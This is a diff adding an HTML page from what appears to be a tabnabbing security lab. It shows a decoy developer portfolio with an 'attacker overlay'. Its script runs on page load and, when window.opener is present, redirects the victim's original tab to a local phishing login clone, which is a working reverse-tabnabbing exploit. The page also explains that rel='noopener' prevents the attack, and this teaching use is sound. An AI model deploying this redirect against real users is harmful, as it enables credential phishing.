@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Portfolio — Welcome!</title>
+  <style>
+    /* ---- Decoy portfolio styles ---- */
+    body {
+      background: #f5f5f0;
+      color: #1a1a1a;
+      font-family: Georgia, 'Times New Roman', serif;
+      margin: 0;
+      padding: 0;
+    }
+    .portfolio-header {
+      background: #1a1a2e;
+      color: #e0e0e0;
+      padding: 40px 48px 32px;
+      border-bottom: 3px solid #e94560;
+    }
+    .portfolio-header h1 {
+      margin: 0 0 8px;
+      font-size: 2rem;
+      color: #ffffff;
+    }
+    .portfolio-header p {
+      margin: 0;
+      color: #a0a0b0;
+      font-size: 1rem;
+    }
+    .portfolio-nav {
+      background: #16213e;
+      padding: 0 48px;
+      display: flex;
+      gap: 0;
+    }
+    .portfolio-nav a {
+      color: #a0b0d0;
+      text-decoration: none;
+      padding: 14px 20px;
+      display: inline-block;
+      font-size: 0.9rem;
+      font-family: Arial, sans-serif;
+      transition: color 0.2s;
+    }
+    .portfolio-nav a:hover { color: #ffffff; background: rgba(255,255,255,0.05); }
+    .portfolio-main {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 40px 32px 64px;
+    }
+    .portfolio-bio {
+      display: flex;
+      gap: 32px;
+      align-items: flex-start;
+      margin-bottom: 40px;
+    }
+    .bio-avatar {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #e94560, #1a1a2e);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.5rem;
+      color: #fff;
+      flex-shrink: 0;
+    }
+    .bio-text h2 { margin: 0 0 8px; font-size: 1.3rem; }
+    .bio-text p  { margin: 0; color: #444; font-size: 0.95rem; line-height: 1.6; }
+    .projects-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      margin-bottom: 32px;
+    }
+    .project-card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+    }
+    .project-card h3 { margin: 0 0 8px; font-size: 1rem; color: #1a1a2e; }
+    .project-card p  { margin: 0; font-size: 0.85rem; color: #555; line-height: 1.5; }
+    .tag {
+      display: inline-block;
+      background: #eef2ff;
+      color: #3355cc;
+      font-size: 0.7rem;
+      padding: 2px 7px;
+      border-radius: 10px;
+      margin: 4px 2px 0 0;
+      font-family: Arial, sans-serif;
+    }
+
+    /* ---- Attacker overlay (fixed, bottom-right) ---- */
+    #attacker-overlay {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #0d1117;
+      color: #e6edf3;
+      font-family: 'Courier New', monospace;
+      font-size: 0.8rem;
+      border: 1px solid #f85149;
+      border-radius: 8px;
+      padding: 14px 16px;
+      max-width: 340px;
+      z-index: 9999;
+      box-shadow: 0 4px 20px rgba(248,81,73,0.25);
+    }
+    #attacker-overlay .overlay-title {
+      color: #f85149;
+      font-weight: bold;
+      margin-bottom: 8px;
+      font-size: 0.82rem;
+    }
+    #attacker-overlay .status  { color: #d29922; }
+    #attacker-overlay .success { color: #3fb950; }
+    #attacker-overlay a { color: #58a6ff; font-size: 0.78rem; }
+  </style>
+</head>
+<body>
+
+  <!-- ==================== DECOY PORTFOLIO ==================== -->
+  <div class="portfolio-header">
+    <h1>Alex Mercer</h1>
+    <p>Full-Stack Developer &amp; Open Source Enthusiast</p>
+  </div>
+
+  <nav class="portfolio-nav">
+    <a href="#">About</a>
+    <a href="#">Projects</a>
+    <a href="#">Blog</a>
+    <a href="#">Contact</a>
+  </nav>
+
+  <main class="portfolio-main">
+    <div class="portfolio-bio">
+      <div class="bio-avatar">A</div>
+      <div class="bio-text">
+        <h2>Hi, I'm Alex.</h2>
+        <p>
+          I build things for the web. Focused on distributed systems, developer tooling, and security research.
+          Five years of experience shipping production software at scale.
+          Currently exploring Rust and WebAssembly in my spare time.
+        </p>
+      </div>
+    </div>
+
+    <h2 style="font-size:1.1rem; margin-bottom:16px;">Recent Projects</h2>
+    <div class="projects-grid">
+      <div class="project-card">
+        <h3>Flux Router</h3>
+        <p>High-performance HTTP router written in Go. 3x faster than gorilla/mux in benchmarks.</p>
+        <span class="tag">Go</span><span class="tag">Networking</span><span class="tag">Open Source</span>
+      </div>
+      <div class="project-card">
+        <h3>Vizlog</h3>
+        <p>Real-time log aggregation dashboard with anomaly detection powered by lightweight ML models.</p>
+        <span class="tag">Python</span><span class="tag">React</span><span class="tag">ML</span>
+      </div>
+      <div class="project-card">
+        <h3>Capsule</h3>
+        <p>Minimal container runtime from scratch — educational project covering namespaces and cgroups.</p>
+        <span class="tag">C</span><span class="tag">Linux</span><span class="tag">Security</span>
+      </div>
+      <div class="project-card">
+        <h3>Notectl</h3>
+        <p>CLI-first note-taking tool that stores notes as plain Markdown with a fuzzy search index.</p>
+        <span class="tag">Rust</span><span class="tag">CLI</span><span class="tag">Open Source</span>
+      </div>
+    </div>
+
+    <p style="color:#666; font-size:0.88rem;">
+      Find me on <a href="#" style="color:#3355cc;">GitHub</a> ·
+      <a href="#" style="color:#3355cc;">Twitter</a> ·
+      <a href="#" style="color:#3355cc;">LinkedIn</a>
+    </p>
+  </main>
+
+  <!-- ==================== ATTACKER OVERLAY ==================== -->
+  <div id="attacker-overlay">
+    <div class="overlay-title">[X4] Tabnabbing Lab — Attacker Page</div>
+    <div id="status" class="status">Checking window.opener...</div>
+    <div id="detail" style="margin-top:6px; color:#7d8590; font-size:0.77rem;"></div>
+    <div style="margin-top:8px;">
+      <a href="index.html">← Exploit Console</a>
+    </div>
+  </div>
+
+  <script>
+    // -------------------------------------------------------
+    // TABNABBING EXPLOIT
+    // This script runs immediately when the page loads.
+    // If the victim clicked a link without rel="noopener",
+    // window.opener is set to the victim's tab — and we can
+    // redirect it to our phishing clone.
+    // -------------------------------------------------------
+
+    const statusEl = document.getElementById('status');
+    const detailEl = document.getElementById('detail');
+
+    if (window.opener) {
+      // window.opener exists — the victim clicked a link without rel="noopener".
+      // We now have a cross-origin reference to their tab.
+      try {
+        // Redirect the victim's original tab to the phishing clone.
+        window.opener.location = 'http://localhost:3001/x4_phish.html';
+
+        statusEl.className = 'success';
+        statusEl.textContent = 'window.opener hijacked!';
+        detailEl.innerHTML =
+          'Original tab redirected to <strong style="color:#f85149;">phishing clone</strong>.<br>' +
+          'The victim\'s tab now shows a fake login page at:<br>' +
+          '<span style="color:#f85149;">http://localhost:3001/x4_phish.html</span>';
+      } catch (err) {
+        // Cross-origin write to location can fail if the browser has protections engaged.
+        statusEl.className = 'error';
+        statusEl.textContent = 'window.opener exists but redirect failed.';
+        detailEl.textContent = 'Error: ' + err.message;
+      }
+    } else {
+      // window.opener is null — the link used rel="noopener" or the user navigated directly.
+      statusEl.className = 'status';
+      statusEl.textContent = 'window.opener is null — link was opened safely.';
+      detailEl.innerHTML =
+        'The originating link used <code style="color:#3fb950;">rel="noopener"</code>, ' +
+        'or you navigated here directly.<br>' +
+        'No tabnabbing possible — opener reference was stripped by the browser.';
+    }
+  </script>
+
+</body>
+</html>
